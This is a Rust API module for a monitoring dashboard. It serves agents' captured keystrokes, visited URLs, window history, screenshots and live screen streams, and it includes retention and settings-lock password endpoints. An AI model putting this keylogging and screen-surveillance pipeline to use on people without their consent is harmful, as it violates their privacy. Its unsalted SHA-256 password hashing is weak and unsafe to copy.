//! REST API endpoints consumed by the dashboard.
//!
//! | Endpoint                        | Description                            |
//! |---------------------------------|----------------------------------------|
//! | `GET /api/agents`               | List all known agents                  |
//! | `GET /api/agents/:id/windows`   | Paginated window-focus history         |
//! | `GET /api/agents/:id/keys`      | Paginated keystroke sessions           |
//! | `GET /api/agents/:id/urls`      | Paginated URL visit history            |
//! | `GET /api/agents/:id/activity`  | Paginated AFK / active events          |
//! | `GET /api/agents/:id/screen`    | Latest JPEG screenshot (single frame)  |
//! | `GET /api/agents/:id/mjpeg`     | MJPEG stream (multipart/x-mixed-replace)|
//! | `GET/PUT /api/settings/retention` | Global telemetry retention (days)    |
//! | `GET/PUT/DELETE /api/agents/:id/retention` | Per-agent retention overrides   |
//! | `GET/PUT /api/settings/local-ui-password` | Agent local settings UI password |
//! | `GET/PUT/DELETE /api/agents/:id/local-ui-password` | Per-agent override        |

use std::convert::Infallible;
use std::sync::Arc;
use std::time::Duration;

use axum::{
    body::Body,
    extract::{Path, Query, State},
    http::{header, StatusCode},
    response::{IntoResponse, Response},
    routing::{get, post},
    Json, Router,
};
use bytes::Bytes;
use futures_util::StreamExt;
use serde::Deserialize;
use uuid::Uuid;

use crate::{db, state::AppState, ws_agent};

// ─── Router ───────────────────────────────────────────────────────────────────

pub fn router() -> Router<Arc<AppState>> {
    Router::new()
        .route("/agents", get(list_agents))
        .route("/agents/overview", get(list_agents_overview))
        .route("/agents/:id/info", get(agent_info))
        .route("/agents/:id/windows", get(agent_windows))
        .route("/agents/:id/keys", get(agent_keys))
        .route("/agents/:id/urls", get(agent_urls))
        .route("/agents/:id/activity", get(agent_activity))
        .route("/agents/:id/history/clear", post(clear_agent_history))
        .route(
            "/agents/:id/retention",
            get(agent_retention_get).put(agent_retention_put).delete(agent_retention_delete),
        )
        .route("/agents/:id/screen", get(agent_screen))
        .route("/agents/:id/mjpeg", get(agent_mjpeg))
        .route(
            "/settings/retention",
            get(retention_global_get).put(retention_global_put),
        )
        .route(
            "/settings/local-ui-password",
            get(local_ui_password_global_get).put(local_ui_password_global_put),
        )
        .route(
            "/agents/:id/local-ui-password",
            get(local_ui_password_agent_get)
                .put(local_ui_password_agent_put)
                .delete(local_ui_password_agent_delete),
        )
        // Domain blocklists intentionally removed for now.
}

// ─── Handlers ─────────────────────────────────────────────────────────────────

async fn list_agents(State(s): State<Arc<AppState>>) -> Response {
    match db::list_agents(&s.db).await {
        Ok(rows) => Json(serde_json::json!({ "agents": rows })).into_response(),
        Err(e) => err500(e),
    }
}

/// Overview list used by the dashboard sidebar: includes offline agents + last session times.
async fn list_agents_overview(State(s): State<Arc<AppState>>) -> Response {
    let agents = match db::list_agents(&s.db).await {
        Ok(rows) => rows,
        Err(e) => return err500(e),
    };

    let online: std::collections::HashMap<uuid::Uuid, chrono::DateTime<chrono::Utc>> = {
        let map = s.agents.lock().unwrap();
        map.iter().map(|(id, a)| (*id, a.connected_at)).collect()
    };

    let mut out: Vec<serde_json::Value> = Vec::with_capacity(agents.len());
    for a in agents {
        let id = match a["id"].as_str().and_then(|s| s.parse::<Uuid>().ok()) {
            Some(id) => id,
            None => continue,
        };
        let (last_connected_at, last_disconnected_at) =
            match db::agent_last_session_times(&s.db, id).await {
                Ok(v) => v,
                Err(e) => return err500(e),
            };
        let connected_at = online.get(&id).copied();
        out.push(serde_json::json!({
            "id": id,
            "name": a["name"],
            "first_seen": a["first_seen"],
            "last_seen": a["last_seen"],
            "online": connected_at.is_some(),
            "connected_at": connected_at,
            "last_connected_at": last_connected_at,
            "last_disconnected_at": last_disconnected_at
        }));
    }

    Json(serde_json::json!({ "agents": out })).into_response()
}

#[derive(Deserialize)]
struct PageParams {
    #[serde(default = "default_limit")]
    limit: i64,
    #[serde(default)]
    offset: i64,
}

fn default_limit() -> i64 {
    50
}

fn validate_page_params(p: &PageParams) -> Result<(), &'static str> {
    // Keep pagination bounded to avoid DB-heavy queries from untrusted clients.
    // (This is still protected by cookie auth for the dashboard API.)
    // The dashboard UI requests limit=500 for URL/Key history pages.
    if !(1..=1000).contains(&p.limit) {
        return Err("limit must be between 1 and 1000");
    }
    if p.offset < 0 || p.offset > 100_000 {
        return Err("offset must be between 0 and 100000");
    }
    Ok(())
}

async fn agent_windows(
    Path(id): Path<Uuid>,
    Query(p): Query<PageParams>,
    State(s): State<Arc<AppState>>,
) -> Response {
    if let Err(msg) = validate_page_params(&p) {
        return (StatusCode::BAD_REQUEST, Json(serde_json::json!({ "error": msg }))).into_response();
    }
    match db::query_windows(&s.db, id, p.limit, p.offset).await {
        Ok(rows) => Json(serde_json::json!({ "rows": rows })).into_response(),
        Err(e) => err500(e),
    }
}

async fn agent_keys(
    Path(id): Path<Uuid>,
    Query(p): Query<PageParams>,
    State(s): State<Arc<AppState>>,
) -> Response {
    if let Err(msg) = validate_page_params(&p) {
        return (StatusCode::BAD_REQUEST, Json(serde_json::json!({ "error": msg }))).into_response();
    }
    match db::query_keys(&s.db, id, p.limit, p.offset).await {
        Ok(rows) => Json(serde_json::json!({ "rows": rows })).into_response(),
        Err(e) => err500(e),
    }
}

async fn agent_urls(
    Path(id): Path<Uuid>,
    Query(p): Query<PageParams>,
    State(s): State<Arc<AppState>>,
) -> Response {
    if let Err(msg) = validate_page_params(&p) {
        return (StatusCode::BAD_REQUEST, Json(serde_json::json!({ "error": msg }))).into_response();
    }
    match db::query_urls(&s.db, id, p.limit, p.offset).await {
        Ok(rows) => Json(serde_json::json!({ "rows": rows })).into_response(),
        Err(e) => err500(e),
    }
}

async fn agent_activity(
    Path(id): Path<Uuid>,
    Query(p): Query<PageParams>,
    State(s): State<Arc<AppState>>,
) -> Response {
    if let Err(msg) = validate_page_params(&p) {
        return (StatusCode::BAD_REQUEST, Json(serde_json::json!({ "error": msg }))).into_response();
    }
    match db::query_activity(&s.db, id, p.limit, p.offset).await {
        Ok(rows) => Json(serde_json::json!({ "rows": rows })).into_response(),
        Err(e) => err500(e),
    }
}

async fn agent_info(Path(id): Path<Uuid>, State(s): State<Arc<AppState>>) -> Response {
    match db::get_agent_info(&s.db, id).await {
        Ok(info) => Json(serde_json::json!({ "info": info })).into_response(),
        Err(e) => err500(e),
    }
}

/// Clear all stored telemetry history for an agent.
async fn clear_agent_history(
    Path(id): Path<Uuid>,
    State(s): State<Arc<AppState>>,
) -> Response {
    match db::clear_agent_history(&s.db, id).await {
        Ok(cleared_rows) => Json(serde_json::json!({ "cleared_rows": cleared_rows })).into_response(),
        Err(e) => err500(e),
    }
}

// ─── Retention (telemetry auto-prune) ─────────────────────────────────────────

#[derive(Deserialize)]
struct RetentionBody {
    keylog_days: Option<i32>,
    window_days: Option<i32>,
    url_days: Option<i32>,
}

fn validate_retention_days(
    keylog_days: Option<i32>,
    window_days: Option<i32>,
    url_days: Option<i32>,
) -> Result<(), &'static str> {
    for d in [keylog_days, window_days, url_days] {
        if let Some(n) = d {
            if !(1..=36_500).contains(&n) {
                return Err("each retention value must be null (forever) or between 1 and 36500 days");
            }
        }
    }
    Ok(())
}

async fn retention_global_get(State(s): State<Arc<AppState>>) -> Response {
    match db::get_retention_global(&s.db).await {
        Ok(p) => Json(serde_json::json!({
            "keylog_days": p.keylog_days,
            "window_days": p.window_days,
            "url_days": p.url_days,
        }))
        .into_response(),
        Err(e) => err500(e),
    }
}

async fn retention_global_put(
    State(s): State<Arc<AppState>>,
    Json(body): Json<RetentionBody>,
) -> Response {
    if let Err(msg) = validate_retention_days(body.keylog_days, body.window_days, body.url_days) {
        return (StatusCode::BAD_REQUEST, Json(serde_json::json!({ "error": msg }))).into_response();
    }
    let p = db::RetentionPolicy {
        keylog_days: body.keylog_days,
        window_days: body.window_days,
        url_days: body.url_days,
    };
    match db::set_retention_global(&s.db, &p).await {
        Ok(()) => retention_global_get(State(s.clone())).await,
        Err(e) => err500(e),
    }
}

async fn agent_retention_get(Path(id): Path<Uuid>, State(s): State<Arc<AppState>>) -> Response {
    let global = match db::get_retention_global(&s.db).await {
        Ok(g) => g,
        Err(e) => return err500(e),
    };
    let ov = match db::get_retention_agent(&s.db, id).await {
        Ok(o) => o,
        Err(e) => return err500(e),
    };
    let override_json = match &ov {
        Some(o) => serde_json::json!({
            "keylog_days": o.keylog_days,
            "window_days": o.window_days,
            "url_days": o.url_days,
        }),
        None => serde_json::Value::Null,
    };

    Json(serde_json::json!({
        "global": {
            "keylog_days": global.keylog_days,
            "window_days": global.window_days,
            "url_days": global.url_days,
        },
        "override": override_json,
    }))
    .into_response()
}

async fn agent_retention_put(
    Path(id): Path<Uuid>,
    State(s): State<Arc<AppState>>,
    Json(body): Json<RetentionBody>,
) -> Response {
    if let Err(msg) = validate_retention_days(body.keylog_days, body.window_days, body.url_days) {
        return (StatusCode::BAD_REQUEST, Json(serde_json::json!({ "error": msg }))).into_response();
    }
    let ov = db::RetentionAgentOverride {
        keylog_days: body.keylog_days,
        window_days: body.window_days,
        url_days: body.url_days,
    };
    match db::set_retention_agent(&s.db, id, &ov).await {
        Ok(()) => agent_retention_get(Path(id), State(s.clone())).await,
        Err(e) => err500(e),
    }
}

async fn agent_retention_delete(Path(id): Path<Uuid>, State(s): State<Arc<AppState>>) -> Response {
    match db::clear_retention_agent(&s.db, id).await {
        Ok(()) => agent_retention_get(Path(id), State(s.clone())).await,
        Err(e) => err500(e),
    }
}

// ─── Agent local UI password (Windows settings window) ───────────────────────

#[derive(Deserialize)]
struct LocalUiPasswordBody {
    /// Plaintext; `null` or omitted + empty string = no password (open) or clear override.
    password: Option<String>,
}

fn validate_local_ui_password_plain(p: &str) -> Result<(), &'static str> {
    if p.is_empty() {
        return Ok(());
    }
    if p.len() < 4 {
        return Err("Password must be at least 4 characters, or leave empty to remove.");
    }
    Ok(())
}

async fn local_ui_password_global_get(State(s): State<Arc<AppState>>) -> Response {
    match db::get_local_ui_global_hash(&s.db).await {
        Ok(h) => {
            let password_set = db::agent_ui_password_is_set(h.as_deref());
            Json(serde_json::json!({ "password_set": password_set })).into_response()
        }
        Err(e) => err500(e),
    }
}

async fn local_ui_password_global_put(
    State(s): State<Arc<AppState>>,
    Json(body): Json<LocalUiPasswordBody>,
) -> Response {
    if let Some(ref p) = body.password {
        if let Err(msg) = validate_local_ui_password_plain(p) {
            return (StatusCode::BAD_REQUEST, Json(serde_json::json!({ "error": msg }))).into_response();
        }
    }
    let hash = match body.password {
        None => None,
        Some(ref p) if p.is_empty() => None,
        Some(ref p) => Some(db::sha256_hex(p)),
    };
    match db::set_local_ui_global_hash(&s.db, hash.as_deref()).await {
        Ok(()) => {
            ws_agent::push_local_ui_password_to_all_connected(&s).await;
            local_ui_password_global_get(State(s.clone())).await
        }
        Err(e) => err500(e),
    }
}

async fn local_ui_password_agent_get(Path(id): Path<Uuid>, State(s): State<Arc<AppState>>) -> Response {
    let global = match db::get_local_ui_global_hash(&s.db).await {
        Ok(h) => h,
        Err(e) => return err500(e),
    };
    let global_set = db::agent_ui_password_is_set(global.as_deref());

    let ov = match db::get_local_ui_override_hash(&s.db, id).await {
        Ok(h) => h,
        Err(e) => return err500(e),
    };
    let override_json = match ov {
        None => serde_json::Value::Null,
        Some(h) => serde_json::json!({ "password_set": db::agent_ui_password_is_set(Some(&h)) }),
    };

    Json(serde_json::json!({
        "global": { "password_set": global_set },
        "override": override_json,
    }))
    .into_response()
}

async fn local_ui_password_agent_put(
    Path(id): Path<Uuid>,
    State(s): State<Arc<AppState>>,
    Json(body): Json<LocalUiPasswordBody>,
) -> Response {
    if let Some(ref p) = body.password {
        if let Err(msg) = validate_local_ui_password_plain(p) {
            return (StatusCode::BAD_REQUEST, Json(serde_json::json!({ "error": msg }))).into_response();
        }
    }
    let hash = match body.password {
        None => None,
        Some(ref p) if p.is_empty() => None,
        Some(ref p) => Some(db::sha256_hex(p)),
    };
    match db::set_local_ui_override_hash(&s.db, id, hash.as_deref()).await {
        Ok(()) => {
            ws_agent::push_local_ui_password_hash_to_agent(&s, id).await;
            local_ui_password_agent_get(Path(id), State(s.clone())).await
        }
        Err(e) => err500(e),
    }
}

async fn local_ui_password_agent_delete(Path(id): Path<Uuid>, State(s): State<Arc<AppState>>) -> Response {
    match db::clear_local_ui_override(&s.db, id).await {
        Ok(()) => {
            ws_agent::push_local_ui_password_hash_to_agent(&s, id).await;
            local_ui_password_agent_get(Path(id), State(s.clone())).await
        }
        Err(e) => err500(e),
    }
}

/// Serve the most-recent JPEG screenshot as a single image.
async fn agent_screen(Path(id): Path<Uuid>, State(s): State<Arc<AppState>>) -> Response {
    let frame = s.frames.lock().unwrap().get(&id).cloned();
    match frame {
        Some(f) => (
            [
                (header::CONTENT_TYPE, "image/jpeg"),
                (header::CACHE_CONTROL, "no-cache, no-store"),
            ],
            f.jpeg,
        )
            .into_response(),
        None => (StatusCode::NOT_FOUND, "No frame available yet").into_response(),
    }
}

/// MJPEG stream — `multipart/x-mixed-replace`.
///
/// The browser renders this directly in an `<img>` tag with no JavaScript
/// needed.  Frames are polled from the in-memory cache every 200 ms (matching
/// the agent capture rate) and only sent when the frame changes.
///
/// ## Demand-driven capture lifecycle
///
/// - On the **first** viewer connecting (while agent is online): `{"type":"start_capture"}`
///   is sent to the agent, which spawns its OS capture thread.
/// - If the agent **reconnects** while a viewer is already watching, the stream
///   loop detects the online→offline→online transition and re-sends
///   `{"type":"start_capture"}` (the agent always stops capture on session end).
/// - On the **last** viewer disconnecting (HTTP connection closes): a RAII
///   [`CaptureGuard`] sends `{"type":"stop_capture"}` so the agent idles at ~0 %
///   CPU until someone watches again.
async fn agent_mjpeg(Path(id): Path<Uuid>, State(s): State<Arc<AppState>>) -> Response {
    const BOUNDARY: &str = "mjpegframe";

    // ── Viewer-count bookkeeping ──────────────────────────────────────────
    let first_viewer = {
        let mut counts = s.capture_viewers.lock().unwrap();
        let count = counts.entry(id).or_insert(0);
        *count += 1;
        *count == 1
    };

    if first_viewer {
        if let Some(tx) = s.agent_cmds.lock().unwrap().get(&id) {
            let _ = tx.send(r#"{"type":"start_capture"}"#.to_string());
        }
    }

    // RAII guard: decrements the viewer count and — when it hits zero —
    // sends `stop_capture` to the agent.  Dropped when the HTTP connection
    // closes (stream future is dropped by Axum).
    let guard = CaptureGuard {
        agent_id: id,
        state: s.clone(),
    };

    // ── Streaming loop ────────────────────────────────────────────────────
    // Clone state so the stream closure can access frames independently.
    let stream_state = s.clone();
    let stream = async_stream::stream! {
        // Moving the guard into the stream keeps it alive until the HTTP
        // connection drops, at which point Drop sends stop_capture.
        let _guard = guard;

        let mut interval = tokio::time::interval(Duration::from_millis(200));
        interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Skip);

        let mut last_seq: u64 = 0;
        // Track whether the agent was reachable on the previous tick so we can
        // re-issue start_capture the moment it comes back online (the agent
        // always stops capture when its WebSocket session ends, so it needs a
        // fresh start_capture even if the MJPEG HTTP connection never dropped).
        let mut agent_was_online = false;

        loop {
            interval.tick().await;

            let agent_online = stream_state.agents.lock().unwrap().contains_key(&id);

            // Agent just (re)connected while we're still watching — send a
            // fresh start_capture so frames start flowing again.
            if agent_online && !agent_was_online {
                if let Some(tx) = stream_state.agent_cmds.lock().unwrap().get(&id) {
                    let _ = tx.send(r#"{"type":"start_capture"}"#.to_string());
                }
            }
            agent_was_online = agent_online;

            let frame = stream_state.frames.lock().unwrap().get(&id).cloned();

            let Some(f) = frame else {
                // Agent not connected yet — keep the connection alive.
                continue;
            };

            // Skip frames we've already sent.
            if f.seq == last_seq {
                continue;
            }
            last_seq = f.seq;

            let header = format!(
                "--{BOUNDARY}\r\n\
                 Content-Type: image/jpeg\r\n\
                 Content-Length: {}\r\n\
                 \r\n",
                f.jpeg.len()
            );

            let mut part: Vec<u8> = header.into_bytes();
            part.extend_from_slice(&f.jpeg);
            part.extend_from_slice(b"\r\n");

            yield Bytes::from(part);
        }
    };

    let result_stream = stream.map(|b| -> Result<Bytes, Infallible> { Ok(b) });

    Response::builder()
        .status(200)
        .header(
            header::CONTENT_TYPE,
            format!("multipart/x-mixed-replace; boundary={BOUNDARY}"),
        )
        .header(header::CACHE_CONTROL, "no-cache, no-store, must-revalidate")
        .header("Connection", "keep-alive")
        .body(Body::from_stream(result_stream))
        .unwrap_or_else(|_| StatusCode::INTERNAL_SERVER_ERROR.into_response())
}

// ─── RAII capture guard ───────────────────────────────────────────────────────

/// Decrements the MJPEG viewer count for `agent_id` when dropped.
/// If the count reaches zero, sends `{"type":"stop_capture"}` to the agent.
struct CaptureGuard {
    agent_id: Uuid,
    state: Arc<AppState>,
}

impl Drop for CaptureGuard {
    fn drop(&mut self) {
        let should_stop = {
            let mut counts = self.state.capture_viewers.lock().unwrap();
            if let Some(count) = counts.get_mut(&self.agent_id) {
                *count = count.saturating_sub(1);
                *count == 0
            } else {
                false
            }
        };

        if should_stop {
            if let Some(tx) = self.state.agent_cmds.lock().unwrap().get(&self.agent_id) {
                let _ = tx.send(r#"{"type":"stop_capture"}"#.to_string());
            }
        }
    }
}

// ─── Helpers ──────────────────────────────────────────────────────────────────

fn err500(e: anyhow::Error) -> Response {
    (
        StatusCode::INTERNAL_SERVER_ERROR,
        Json(serde_json::json!({ "error": e.to_string() })),
    )
        .into_response()
}
